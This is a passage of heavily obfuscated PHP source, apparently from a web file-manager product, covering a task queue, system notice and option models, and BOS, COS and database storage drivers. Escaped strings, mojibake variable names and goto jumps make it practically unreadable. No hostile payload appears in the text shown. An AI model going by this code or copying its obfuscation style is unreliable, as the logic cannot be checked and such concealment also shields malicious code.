"\164\141\163\153\121\x75\x65\165\145\114\145\x6e\147\164\x68"; const QUEUE_DATA = "\164\141\x73\x6b\121\x75\145\165\145\x44\141\164\141"; const QUEUE_TIME = "\x74\141\x73\x6b\x51\x75\145\x75\x65\114\141\163\164\x52\165\156"; const QUEUE_THREAD = "\x74\141\163\153\x51\x75\145\165\x65\124\x68\162\x65\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Ÿ…¨¡¾Æ, $ûíèÎ = array(), $Áª²áÚ¿ = '', $Ğ¾ú³şè = '') { $éß´É =& $_SERVER[Ñ¯©ç]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Ğ¾ú³şè && array_find_by_field(self::$listData, $éß´É[107], $Ğ¾ú³şè)) { return !0; } if ($Ğ¾ú³şè && array_find_by_field(self::$listDataAdd, $éß´É[107], $Ğ¾ú³şè)) { return !0; } self::$listDataAdd[] = array($éß´É[325] => $Ÿ…¨¡¾Æ, $éß´É[1855] => $ûíèÎ, $éß´É[509] => $Áª²áÚ¿, $éß´É[107] => $Ğ¾ú³şè); return !0; } public static function addSubmit() { $ø³×İñ± =& $_SERVER[Ñ¯©ç]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ø³×İñ±[1856] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ø³×İñ±[12], $ø³×İñ±[509])), $ø³×İñ±[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ª¾¦Ä»ƒ, $Íâ°…áÆ = array(), $´»ÉÕÎ¤ = '', $àı€ÂŞ = '') { $…ò×íèÆ =& $_SERVER[Ñ¯©ç]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Éœ‚—š = self::getAll(); if ($àı€ÂŞ && array_find_by_field($Éœ‚—š, $…ò×íèÆ[107], $àı€ÂŞ)) { return !0; } $Éœ‚—š[] = array($…ò×íèÆ[325] => $ª¾¦Ä»ƒ, $…ò×íèÆ[1855] => $Íâ°…áÆ, $…ò×íèÆ[509] => $´»ÉÕÎ¤, $…ò×íèÆ[107] => $àı€ÂŞ); self::setAll($Éœ‚—š); write_log($…ò×íèÆ[1856] . $´»ÉÕÎ¤, $…ò×íèÆ[198]); return !0; } public static function run() { $ÊšŠ¬Ì— =& $_SERVER[Ñ¯©ç]; $ÑğîŸÅˆ = self::getAll(); $Ò½ÚÑƒÂ = array_shift($ÑğîŸÅˆ); if (!$Ò½ÚÑƒÂ) { return !1; } self::setAll($ÑğîŸÅˆ); $Æàúõ•± = timeFloat(); $ªæ¶ÇéŞ = $ÊšŠ¬Ì—[12]; try { $ªæ¶ÇéŞ = Hook::apply($Ò½ÚÑƒÂ[$ÊšŠ¬Ì—[325]], $Ò½ÚÑƒÂ[$ÊšŠ¬Ì—[1855]]); } catch (Exception $×ÛÓ­ÃÅ) { write_log($×ÛÓ­ÃÅ, $ÊšŠ¬Ì—[1239]); } $¯’¢Í­ = number_format(timeFloat() - $Æàúõ•±, 3) . $ÊšŠ¬Ì—[1773]; if ($ªæ¶ÇéŞ && is_string($ªæ¶ÇéŞ)) { $¯’¢Í­ = $¯’¢Í­ . $ÊšŠ¬Ì—[1857] . $ªæ¶ÇéŞ; } write_log($ÊšŠ¬Ì—[1858] . $Ò½ÚÑƒÂ[$ÊšŠ¬Ì—[509]] . $ÊšŠ¬Ì—[1859] . $¯’¢Í­, $ÊšŠ¬Ì—[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Ã¬ˆ“‘ =& $_SERVER[Ñ¯©ç]; $èÄ¥øè¥ = self::threadCount() + 1; if ($èÄ¥øè¥ > 3 || !self::count()) { return; } write_log($Ã¬ˆ“‘[1860] . $èÄ¥øè¥, $Ã¬ˆ“‘[198]); Cache::set(self::QUEUE_THREAD, $èÄ¥øè¥, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Ã¬ˆ“‘[1861], $Ã¬ˆ“‘[198]); } public static function getKey($ÔèØøİ», $«±¿à‰Ø = "\x69\156\x74") { $«¨¾ =& $_SERVER[Ñ¯©ç]; Cache::removeMemory($ÔèØøİ»); $å’©Ì³ä = Cache::get($ÔèØøİ»); if ($«±¿à‰Ø == $«¨¾[348]) { return $å’©Ì³ä ? intval($å’©Ì³ä) : 0; } if ($«±¿à‰Ø == $«¨¾[1862]) { return is_array($å’©Ì³ä) ? $å’©Ì³ä : array(); } return $å’©Ì³ä; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[Ñ¯©ç][1862]); } public static function setAll($öÏÉœë”) { $İŸóÇ›´ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($öÏÉœë”), $İŸóÇ›´); Cache::set(self::QUEUE_DATA, $öÏÉœë”, $İŸóÇ›´); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto E´‰ŠÉ´É; bğ„èÑ÷¥‘: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\x2e\x6e\x6f\x74\x69\143\145\114\x69\163\x74"; public $field = array("\x6e\141\x6d\145", "\143\x6f\156\x74\145\156\x74", "\x61\165\x74\x68", "\155\x6f\x64\145", "\164\x69\155\x65", "\x74\171\x70\x65", "\154\x65\166\x65\154", "\145\156\x61\142\x6c\145", "\x73\157\x72\x74"); public function listData($ûİ™ã‚â = false, $çŠ¶†² = "\163\x6f\162\164", $«Õü´Ñ· = false) { return parent::listData($ûİ™ã‚â, $çŠ¶†², $«Õü´Ñ·); } public function add($ûÀ”Ç¸×) { $àÂ­€ë™ =& $_SERVER[Ñ¯©ç]; $§Å¡˜¿ä = time(); if ($ûÀ”Ç¸×[$àÂ­€ë™[16]] == $àÂ­€ë™[2414]) { $§Å¡˜¿ä = strtotime($ûÀ”Ç¸×[$àÂ­€ë™[207]]); } $ûÀ”Ç¸×[$àÂ­€ë™[207]] = $§Å¡˜¿ä; return parent::insert($ûÀ”Ç¸×); } public function update($úµµê÷‰, $†°¹°õü) { $½ Œü°¿ =& $_SERVER[Ñ¯©ç]; $÷È°ëãû = $this->listData($úµµê÷‰); if (!$÷È°ëãû) { return !1; } $óÄ±üî = time(); if ($†°¹°õü[$½ Œü°¿[16]] == $½ Œü°¿[2414]) { $óÄ±üî = strtotime($†°¹°õü[$½ Œü°¿[207]]); } $†°¹°õü[$½ Œü°¿[207]] = $óÄ±üî; return parent::update($úµµê÷‰, $†°¹°õü); } public function remove($è¿Œ÷“¹) { $€Á‹´¡á = $this->listData($è¿Œ÷“¹); if (!$€Á‹´¡á || $€Á‹´¡á[$_SERVER[Ñ¯©ç][192]]) { return !1; } return parent::remove($è¿Œ÷“¹); } public function sort($’ÆñÇ®ø, $ŞßÖ˜…Ğ) { return parent::update($’ÆñÇ®ø, $ŞßÖ˜…Ğ); } public function enable($çúÜ ‡, $ÛÛãÌÅÖ) { return parent::update($çúÜ ‡, array($_SERVER[Ñ¯©ç][2415] => $ÛÛãÌÅÖ)); } private function initUserOption() { $×È¿—–Ÿ =& $_SERVER[Ñ¯©ç]; $this->optionType = $×È¿—–Ÿ[2416]; $this->modelType = $×È¿—–Ÿ[2417]; $this->field = array($×È¿—–Ÿ[2418], $×È¿—–Ÿ[32], $×È¿—–Ÿ[207], $×È¿—–Ÿ[33], $×È¿—–Ÿ[2419], $×È¿—–Ÿ[803], $×È¿—–Ÿ[227]); } public function userNoticeGet($Üû—ú£× = false) { $this->initUserOption(); return parent::listData($Üû—ú£×, $_SERVER[Ñ¯©ç][458], !0); } public function userNoticeAdd($Öçµ†ñ›) { $ûğù†£º =& $_SERVER[Ñ¯©ç]; $this->initUserOption(); $£ªğÛµ³ = $this->findByKey($ûğù†£º[2418], $Öçµ†ñ›[$ûğù†£º[458]]); if ($£ªğÛµ³) { return !0; } $‹ãı¼™ = array($ûğù†£º[2418] => $Öçµ†ñ›[$ûğù†£º[458]], $ûğù†£º[32] => $Öçµ†ñ›[$ûğù†£º[32]], $ûğù†£º[207] => $Öçµ†ñ›[$ûğù†£º[207]], $ûğù†£º[33] => isset($Öçµ†ñ›[$ûğù†£º[33]]) ? $Öçµ†ñ›[$ûğù†£º[33]] : 1, $ûğù†£º[2419] => isset($Öçµ†ñ›[$ûğù†£º[2419]]) ? $Öçµ†ñ›[$ûğù†£º[2419]] : 0, $ûğù†£º[803] => 0, $ûğù†£º[227] => 0); return parent::insert($‹ãı¼™); } public function userNoticeEdit($ğµÀ§Ïº, $¼šõışš) { $this->initUserOption(); return parent::update($ğµÀ§Ïº, $¼šõışš); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\164\x65\155\137\157\x70\164\x69\157\x6e"; protected $jsonField = array("\155\145\156\x75", "\x72\x6f\x6c\145", "\162\157\154\145\107\162\x6f\165\x70", "\162\145\147\x69\163\x74", "\x65\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($¥Ñ¬¿ì›) { return "\123\x79\163\164\x65\x6d\x4f\160\164\151\x6f\x6e\137{$¥Ñ¬¿ì›}"; } protected function optionDefault($ß¾´¾¼È = '') { $“óä–ö¸ =& $_SERVER[Ñ¯©ç]; if ($ß¾´¾¼È == $“óä–ö¸[12]) { return $GLOBALS[$“óä–ö¸[6]][$“óä–ö¸[440]]; } } } class SystemRecordModel extends ModelBaseLight { } goto d‡Ùğ‡Ä; f‚½£®É˜­: class PathDriverBOS extends PathDriverS3 { public function __construct($äçÃéëà) { parent::__construct($äçÃéëà); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($Çæà¶ß‚) { $Ñî¡†¹ =& $_SERVER[Ñ¯©ç]; if (substr($Çæà¶ß‚, 0, 7) == $Ñî¡†¹[1381]) { $Çæà¶ß‚ = $Ñî¡†¹[1382] . substr($Çæà¶ß‚, 7); } header($Ñî¡†¹[175] . $Çæà¶ß‚); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ëİµ¹ãı) { parent::__construct($ëİµ¹ãı); $this->setSignVersion($_SERVER[Ñ¯©ç][248]); } public function uploadFormData($öş°‡¡¨, $Äş¿¦¿º = 3600) { $Ğœí½ä˜ =& $_SERVER[Ñ¯©ç]; $œ¬ ÒÄö = $Ğœí½ä˜[230]; $À‹—Şš’ = $Ğœí½ä˜[263]; $Ğ—áÉ´ = $Ğœí½ä˜[274]; $¡³ñĞù• = gmdate($Ğœí½ä˜[1383], time() + $Äş¿¦¿º); $‚ö¶ĞŒİ = (string) time() . $Ğœí½ä˜[84] . (string) (time() + $Äş¿¦¿º); $ÑÁ’à±ø = array($Ğœí½ä˜[275] => $¡³ñĞù•, $Ğœí½ä˜[278] => array(array($Ğœí½ä˜[280] => $œ¬ ÒÄö), array($Ğœí½ä˜[279] => $this->bucket), array($Ğœí½ä˜[281], $Ğœí½ä˜[282], $Ğœí½ä˜[12]), array($Ğœí½ä˜[285] => $Ğ—áÉ´), array($Ğœí½ä˜[1384] => $À‹—Şš’), array($Ğœí½ä˜[1385] => $this->accessKey), array($Ğœí½ä˜[1386] => $‚ö¶ĞŒİ))); $ÑÁ’à±ø = json_encode($ÑÁ’à±ø); $ÆÀ€ß = hash_hmac($Ğœí½ä˜[263], $‚ö¶ĞŒİ, $this->secret); $µšßùç• = sha1($ÑÁ’à±ø); $ŞÂµ£ = hash_hmac($Ğœí½ä˜[263], $µšßùç•, $ÆÀ€ß); $ı¿Ã…ñ = array($Ğœí½ä˜[280] => $œ¬ ÒÄö, $Ğœí½ä˜[285] => $Ğ—áÉ´, $Ğœí½ä˜[293] => base64_encode($ÑÁ’à±ø), $Ğœí½ä˜[1384] => $À‹—Şš’, $Ğœí½ä˜[1385] => $this->accessKey, $Ğœí½ä˜[1387] => $‚ö¶ĞŒİ, $Ğœí½ä˜[1388] => $ŞÂµ£, $Ğœí½ä˜[209] => $this->getHost()); return $ı¿Ã…ñ; } public function fileOutImage($Åáõ»“, $şÈ™Ú´Ò = 250) { $”¹¿ÆÛ– =& $_SERVER[Ñ¯©ç]; if ($this->size($Åáõ»“) > 1024 * 1024 * 32) { return $this->fileOutImageServer($Åáõ»“, $şÈ™Ú´Ò); } $ª‡å€Œû = $this->link($Åáõ»“); $ª‡å€Œû .= $”¹¿ÆÛ–[1389] . $şÈ™Ú´Ò . $”¹¿ÆÛ–[1390]; $this->fileOutLink($ª‡å€Œû); } public function fileOutLink($’Ç§‘šâ) { $”Ì‘ÙáÌ =& $_SERVER[Ñ¯©ç]; if (substr($’Ç§‘šâ, 0, 7) == $”Ì‘ÙáÌ[1381]) { $’Ç§‘šâ = $”Ì‘ÙáÌ[1382] . substr($’Ç§‘šâ, 7); } header($”Ì‘ÙáÌ[175] . $’Ç§‘šâ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ì¥†¦©Ÿ) { $this->pathParse = $Ì¥†¦©Ÿ; $this->model = Model($_SERVER[Ñ¯©ç][1391]); } public function getPath($É”À›¬) { return trim($É”À›¬, $_SERVER[Ñ¯©ç][8]); } public function pathFather($¡Ãœ˜ãŒ) { $‹¾ƒÒÙŠ = $this->parse($¡Ãœ˜ãŒ); $‹¾ƒÒÙŠ = $this->infoSimple($¡Ãœ˜ãŒ); return $‹¾ƒÒÙŠ ? $‹¾ƒÒÙŠ[$_SERVER[Ñ¯©ç][193]] : !1; } public function pathThis($‹†å±ß‰) { $®‚şÄæ¿ = $this->infoSimple($‹†å±ß‰); return $®‚şÄæ¿ ? $®‚şÄæ¿[$_SERVER[Ñ¯©ç][32]] : !1; } public function getPathOuter($‘‘·¤Œ) { if (!$‘‘·¤Œ) { return $‘‘·¤Œ; } $„ß•Óèø = $this->parse($‘‘·¤Œ); return KodIO::make($„ß•Óèø[$_SERVER[Ñ¯©ç][458]]); } public function copyFolderFromIO($·«„ßú, $Àˆ›¼æ¶, $ù§òàãŸ, $â½³ò—Ğ, $Â¼ÌèøÂ) { $ö‰§Ïåê = $this->model->copyFolderFromIO($·«„ßú, $Àˆ›¼æ¶, $ù§òàãŸ, $â½³ò—Ğ, $Â¼ÌèøÂ); return KodIO::make($ö‰§Ïåê); } public function isParentOf($ñ¶£Ê¾¸, $·”¢ÁÍ) { return $this->model->isParentOf($ñ¶£Ê¾¸, $·”¢ÁÍ); } public function mkfile($ÚŒœÛÏ, $—™¨ãˆ = '', $Ã„Äªç = REPEAT_RENAME) { $‚é ¯äÍ =& $_SERVER[Ñ¯©ç]; $÷¹Ó‹ã = $this->parse($ÚŒœÛÏ); $ÚŒœÛÏ = $÷¹Ó‹ã[$‚é ¯äÍ[458]]; for ($ñõ¸†Üµ = 0; $ñõ¸†Üµ < count($÷¹Ó‹ã[$‚é ¯äÍ[1392]]); $ñõ¸†Üµ++) { $ÄªĞ§ù = $÷¹Ó‹ã[$‚é ¯äÍ[1392]][$ñõ¸†Üµ]; if ($ñõ¸†Üµ == count($÷¹Ó‹ã[$‚é ¯äÍ[1392]]) - 1) { $ÚŒœÛÏ = $this->model->mkfile($ÚŒœÛÏ, $ÄªĞ§ù, $—™¨ãˆ, $Ã„Äªç); break; } $ÚŒœÛÏ = $this->model->mkdir($ÚŒœÛÏ, $ÄªĞ§ù, REPEAT_SKIP); } return $this->getPathOuter($ÚŒœÛÏ); } public function mkdir($·ıãÜìÈ, $àì›¤¶Ó = REPEAT_SKIP) { $Æª’Î‚ì =& $_SERVER[Ñ¯©ç]; $¿ÒÙîÙÊ = $this->parse($·ıãÜìÈ); $·ıãÜìÈ = $¿ÒÙîÙÊ[$Æª’Î‚ì[458]]; for ($Í ù‘¿’ = 0; $Í ù‘¿’ < count($¿ÒÙîÙÊ[$Æª’Î‚ì[1392]]); $Í ù‘¿’++) { $äòñÂ¹¾ = $¿ÒÙîÙÊ[$Æª’Î‚ì[1392]][$Í ù‘¿’]; $·ıãÜìÈ = $this->model->mkdir($·ıãÜìÈ, $äòñÂ¹¾, $àì›¤¶Ó); } return $this->getPathOuter($·ıãÜìÈ); } public function copyFile($Ë¾Í¹îé, $íØîæîİ, $ñÙ‰åÜ‡ = REPEAT_REPLACE) { $Ú³Í®ûø =& $_SERVER[Ñ¯©ç]; $À—›ˆåª = $this->parse($íØîæîİ); $Ö‘¨œÈ× = $this->model->copy($Ë¾Í¹îé, $À—›ˆåª[$Ú³Í®ûø[458]], $ñÙ‰åÜ‡, $À—›ˆåª[$Ú³Í®ûø[97]]); return $Ö‘¨œÈ× ? $this->getPathOuter($Ö‘¨œÈ×) : !1; } public function moveFile($»ŸÙÑŒŸ, $îà ê’ñ, $›½µ¾ÃÛ = REPEAT_REPLACE) { $Ç‘À“ó„ =& $_SERVER[Ñ¯©ç]; $––«ØÙç = $this->parse($îà ê’ñ); $êéêÚ«ò = $this->model->move($»ŸÙÑŒŸ, $––«ØÙç[$Ç‘À“ó„[458]], $›½µ¾ÃÛ, $––«ØÙç[$Ç‘À“ó„[97]]); return $êéêÚ«ò ? $this->getPathOuter($êéêÚ«ò) : !1; } public function copy($Ş×ñåÌö, $öî…–ù†, $·åï™Õİ = REPEAT_REPLACE, $ÊşŒÖÁ¸ = false) { $ìÏæ‡¼ˆ = $this->parse($öî…–ù†); $ß²ó¸ = $this->model->copy($Ş×ñåÌö, $ìÏæ‡¼ˆ[$_SERVER[Ñ¯©ç][458]], $·åï™Õİ, $ÊşŒÖÁ¸); return $ß²ó¸ ? $this->getPathOuter($ß²ó¸) : !1; } public function moveSameAllow() { } public function move($İ’®Œê, $ü¼¤¯¡ø, $“¤ÒË­¢ = REPEAT_REPLACE, $¬ä–‰çŞ = false) { $‰·Ñ×Ã« = $this->parse($ü¼¤¯¡ø); $Ë¿Ó¦§ = $this->model->move($İ’®Œê, $‰·Ñ×Ã«[$_SERVER[Ñ¯©ç][458]], $“¤ÒË­¢, $¬ä–‰çŞ); return $Ë¿Ó¦§ ? $this->getPathOuter($Ë¿Ó¦§) : !1; } public function remove($‹Üª“µ÷, $êºÙ«Å˜ = true) { return $this->model->remove($‹Üª“µ÷, $êºÙ«Å˜); } public function rename($°©áÂ×, $ÀÇß²Ìå) { $İÂ—¸òä = $this->model->rename($°©áÂ×, $ÀÇß²Ìå); return $İÂ—¸òä ? $this->getPathOuter($°©áÂ×) : $İÂ—¸òä; } public function size($š‰åÆæŠ) { $Úßîóê = $this->infoSimple($š‰åÆæŠ); return $Úßîóê ? $Úßîóê[$_SERVER[Ñ¯©ç][89]] : 0; } public function infoSimple($®öÎÒØ) { return $this->model->sourceInfo($®öÎÒØ); } public function info($˜¹·¾½) { return $this->infoParse($˜¹·¾½); } public function infoAuth($ ÈÜÒ›Î) { return $this->infoParse($ ÈÜÒ›Î, !1, !0); } public function infoWithChildren($´ó§‡É) { return $this->infoParse($´ó§‡É, !0); } protected function infoParse($ÔàÚÉîˆ, $Øş¤á“Ä = false, $²€êàöÁ = false) { if (!$Øş¤á“Ä) { return $this->model->pathInfo($ÔàÚÉîˆ, $²€êàöÁ); } return $this->model->pathInfoMore($ÔàÚÉîˆ); } public function infoFullSimple($ÖÂš¸ĞÆ) { $â‹È¼óÄ =& $_SERVER[Ñ¯©ç]; $´ı»¹ÇÒ = explode($â‹È¼óÄ[8], $ÖÂš¸ĞÆ); $åöıç˜¨ = implode($â‹È¼óÄ[8], array_splice($´ı»¹ÇÒ, 1)); return $this->model->pathInfoByPath($´ı»¹ÇÒ[0], $åöıç˜¨); } public function infoFull($¶•ŸÕÓ¿) { $Ì’ÓæÎĞ = $this->infoFullSimple($¶•ŸÕÓ¿); return is_array($Ì’ÓæÎĞ) ? $this->model->pathInfo($Ì’ÓæÎĞ[$_SERVER[Ñ¯©ç][194]]) : !1; } public function hashSimple($õ­ŸèĞù) { $æ§ûø¨ =& $_SERVER[Ñ¯©ç]; $éÉİÙµÂ = $this->infoWithChildren($õ­ŸèĞù); return $éÉİÙµÂ[$æ§ûø¨[532]][$æ§ûø¨[655]]; } public function hashMd5($Ê§’Ôó®) { $ê‘ÅÏ© =& $_SERVER[Ñ¯©ç]; $ë™£ÜöÁ = $this->infoWithChildren($Ê§’Ôó®); return $ë™£ÜöÁ[$ê‘ÅÏ©[532]][$ê‘ÅÏ©[530]]; } public function exist($Ò»ßÉìÜ) { $‰æöé§Í =& $_SERVER[Ñ¯©ç]; $‚ñ’Ğâ = $this->parse($Ò»ßÉìÜ); if (!$‚ñ’Ğâ[$‰æöé§Í[97]]) { return $this->isFile($Ò»ßÉìÜ) || $this->isFolder($Ò»ßÉìÜ); } $µ©òğ€İ = array($‰æöé§Í[460] => $‚ñ’Ğâ[$‰æöé§Í[458]], $‰æöé§Í[32] => $‚ñ’Ğâ[$‰æöé§Í[97]]); $…®ñúõœ = $this->model->where($µ©òğ€İ)->find(); return $…®ñúõœ ? !0 : !1; } public function isFile($ç·Ãš ª) { $Ì›µÎô =& $_SERVER[Ñ¯©ç]; $àüÃ…Ùğ = $this->infoSimple($ç·Ãš ª); return $àüÃ…Ùğ && $àüÃ…Ùğ[$Ì›µÎô[468]] == $Ì›µÎô[229] ? !0 : !1; } public function isFolder($µ§ãØÓÈ) { $ÑæñÑªî =& $_SERVER[Ñ¯©ç]; $€Ğˆüê¹ = $this->infoSimple($µ§ãØÓÈ); return $€Ğˆüê¹ && $€Ğˆüê¹[$ÑæñÑªî[468]] == $ÑæñÑªî[101] ? !0 : !1; } public function listPath($©ØÏÒ„ã, $«Ò’Ñ±À = false) { $îÈÂ«›£ =& $_SERVER[Ñ¯©ç]; if ($©ØÏÒ„ã == $îÈÂ«›£[12]) { return !1; } $ ˆ—ÏïÁ = array($îÈÂ«›£[460] => $©ØÏÒ„ã); if ($«Ò’Ñ±À) { return $this->model->listSource($ ˆ—ÏïÁ, -1); } return $this->model->listSource($ ˆ—ÏïÁ); } public function has($ÔÓäï«, $÷â‚ô¯¹ = false, $‹¯ù»¶ = null) { $ƒ„Íõêö =& $_SERVER[Ñ¯©ç]; $éèŒ€µ = $this->infoWithChildren($ÔÓäï«); if ($÷â‚ô¯¹) { return array($ƒ„Íõêö[241] => $éèŒ€µ[$ƒ„Íõêö[241]], $ƒ„Íõêö[240] => $éèŒ€µ[$ƒ„Íõêö[240]]); } return $‹¯ù»¶ ? $éèŒ€µ[$ƒ„Íõêö[241]] : $éèŒ€µ[$ƒ„Íõêö[240]]; } public function listAll($…ˆÈù¬Ù) { $…æº£„ä = IO::info($this->pathParse[$_SERVER[Ñ¯©ç][97]]); if (!$…æº£„ä) { return array(); } return $this->model->listAll($…ˆÈù¬Ù); } public function getContent($ØÕ’›¡›) { return $this->model->getContent($ØÕ’›¡›); } public function setContent($ƒ•±Ã¦­, $è‰…”¬æ = '') { return $this->model->setContent($ƒ•±Ã¦­, $è‰…”¬æ); } public function fileSubstr($ÕßÃ¤º, $¼´Àäˆ, $›á’®»ƒ) { return $this->model->fileSubstr($ÕßÃ¤º, $¼´Àäˆ, $›á’®»ƒ); } public function download($İÆ ß¬, $Ğ£ÜËêÏ = '') { $™¼Åªœ© = get_path_father($Ğ£ÜËêÏ); $€íÊÕææ = get_path_this($Ğ£ÜËêÏ); $¶¹ÉİŒò = $this->model->fileInfoGet($İÆ ß¬); $¨ÖŸµµ = IO::copy($¶¹ÉİŒò[$_SERVER[Ñ¯©ç][97]], $™¼Åªœ©, !1, $€íÊÕææ); return $¨ÖŸµµ; } public function setModifyTime($îù·—´ø, $“Æí÷Íà = '') { $ĞË©ü² =& $_SERVER[Ñ¯©ç]; if (!$îù·—´ø) { return; } $this->model->where(array($ĞË©ü²[474] => $îù·—´ø))->save(array($ĞË©ü²[98] => $“Æí÷Íà)); } public function upload($°Å±Ï’, $Ğé¤ƒÑ‡, $¡ı˜áÅ = false, $ıìş‡Ó— = REPEAT_REPLACE) { $•íä•ƒÆ =& $_SERVER[Ñ¯©ç]; $üê´¤¾Æ = $this->parse($°Å±Ï’); $µØâ’Ò™ = $this->model->addFile($üê´¤¾Æ[$•íä•ƒÆ[458]], $Ğé¤ƒÑ‡, $üê´¤¾Æ[$•íä•ƒÆ[97]], $¡ı˜áÅ, $ıìş‡Ó—); return $this->getPathOuter($µØâ’Ò™); } public function uploadFileByID($æüºÔËš, $À—ûÜ, $áĞİŸó¿) { $«ÀŠ´œš =& $_SERVER[Ñ¯©ç]; $€Ï­×À° = $this->parse($æüºÔËš); $‚§Æ½á¯ = $this->model->addFileByFileID($€Ï­×À°[$«ÀŠ´œš[458]], $À—ûÜ, $€Ï­×À°[$«ÀŠ´œš[97]], $áĞİŸó¿); return $this->getPathOuter($‚§Æ½á¯); } public function addFileByRemote($Ã–Íã÷Í, $™¡Îõï, $¤³š§“Ø = array(), $Š·–¼˜À = '', $ıÓÍ õ) { $Î’èÈç’ =& $_SERVER[Ñ¯©ç]; $½ÜÛ¼º¬ = $this->parse($Ã–Íã÷Í); $Š·–¼˜À = empty($Š·–¼˜À) ? $½ÜÛ¼º¬[$Î’èÈç’[97]] : $Š·–¼˜À; $¼ÈÇ±æª = $this->model->addFileByRemote($½ÜÛ¼º¬[$Î’èÈç’[458]], $™¡Îõï, $Š·–¼˜À, $¤³š§“Ø, $ıÓÍ õ); return $this->getPathOuter($¼ÈÇ±æª); } public function uploadLink($«Ğ»Ó, $ÅóÂĞÉ¾ = 0) { $İÌ‰…‰ =& $_SERVER[Ñ¯©ç]; $…ÚÅ¼ÓÔ = $this->parse($«Ğ»Ó); $†ÒØÓÓÆ = _get($GLOBALS[$İÌ‰…‰[7]], $İÌ‰…‰[1393]); $ÆëÅ¥“ = _get($GLOBALS[$İÌ‰…‰[7]], $İÌ‰…‰[1394]); $«Ğ»Ó = Model($İÌ‰…‰[657])->createFileName($…ÚÅ¼ÓÔ[$İÌ‰…‰[97]], $†ÒØÓÓÆ, $ÆëÅ¥“); return IO::uploadLink($«Ğ»Ó, $ÅóÂĞÉ¾); } public function fileNameAuto($ÊğÌğÂ, $‘£¶ÂÖ, $Üüàîïø = REPEAT_REPLACE, $Ğ¦Ó¡íœ = false) { return $this->model->fileNameAuto($ÊğÌğÂ, $‘£¶ÂÖ, $Üüàîïø, $Ğ¦Ó¡íœ); } public function fileNameExist($ôº©ôœí, $ÜÖõàÎ£) { return $this->model->fileNameExist($ôº©ôœí, $ÜÖõàÎ£); } protected function _fileOut($Ç´‚”„Ü, $Î•¶ñ±à = false, $½Üşä‹ = false, $ßÕÒÄÍß = '', $–ùé–¯¸ = false) { $´àÇ²Åü =& $_SERVER[Ñ¯©ç]; $Ï¹Ïäİ› = $this->model->sourceInfo($Ç´‚”„Ü); if ($Ï¹Ïäİ›[$´àÇ²Åü[468]] == $´àÇ²Åü[101]) { header($´àÇ²Åü[1395]); die; } $ÙŒïàÁó = $this->model->fileInfoGet($Ç´‚”„Ü); $ßÕÒÄÍß = $ÙŒïàÁó[$´àÇ²Åü[530]] ? $ÙŒïàÁó[$´àÇ²Åü[530]] : $ßÕÒÄÍß; $ïééæá = is_array($GLOBALS[$´àÇ²Åü[182]]) ? $GLOBALS[$´àÇ²Åü[182]][$´àÇ²Åü[32]] : $Ï¹Ïäİ›[$´àÇ²Åü[32]]; if ($–ùé–¯¸) { return IO::fileOutServer($ÙŒïàÁó[$´àÇ²Åü[97]], $Î•¶ñ±à, $ïééæá, $ßÕÒÄÍß); } IO::fileOut($ÙŒïàÁó[$´àÇ²Åü[97]], $Î•¶ñ±à, $ïééæá, $ßÕÒÄÍß); } public function fileOut($Ş›±¤•, $¼Ë¾Ìµé = false, $·‘–›·â = false, $Ñæ¡ß‚ı = '') { $this->_fileOut($Ş›±¤•, $¼Ë¾Ìµé, $·‘–›·â, $Ñæ¡ß‚ı); } public function fileOutServer($†üØŒ, $¥¥¢Åµ = false, $Õ¶îøÂÅ = false, $õÎ€ì©Å = '') { $this->_fileOut($†üØŒ, $¥¥¢Åµ, $Õ¶îøÂÅ, $õÎ€ì©Å, !0); } protected function _fileOutImage($€¬öæÂú, $ï–“çÚº = 250) { $æŒ¸Ó =& $_SERVER[Ñ¯©ç]; $‹Úàúüö = $this->model->pathInfo($€¬öæÂú); if ($‹Úàúüö[$æŒ¸Ó[468]] == $æŒ¸Ó[101]) { show_json($æŒ¸Ó[1396] . $€¬öæÂú, !1); } $ä¤Øü´ = $this->model->fileInfoGet($€¬öæÂú); $‹Úàúüö[$æŒ¸Ó[183]] = $ä¤Øü´[$æŒ¸Ó[97]]; $GLOBALS[$æŒ¸Ó[182]] = $‹Úàúüö; IO::fileOutImage($ä¤Øü´[$æŒ¸Ó[97]], $ï–“çÚº); } public function fileOutImage($ŠÄÂšâê, $µª¹ğ¼ = 250) { $this->_fileOutImage($ŠÄÂšâê, $µª¹ğ¼); } public function fileOutImageServer($¶Ü‘ç“, $±Š™ÖßÕ = 250) { $this->_fileOutImage($¶Ü‘ç“, $±Š™ÖßÕ); } public function link($«Ì‡Şøú, $ĞÆî¸Œß = '') { $ŠïâÈèá = $this->model->fileInfoGet($«Ì‡Şøú); return IO::link($ŠïâÈèá[$_SERVER[Ñ¯©ç][97]], $ĞÆî¸Œß); } protected function parse($¥´°ùˆ) { $¢ÈÄş¢ =& $_SERVER[Ñ¯©ç]; if (strstr($¥´°ùˆ, $¢ÈÄş¢[8]) === !1) { return 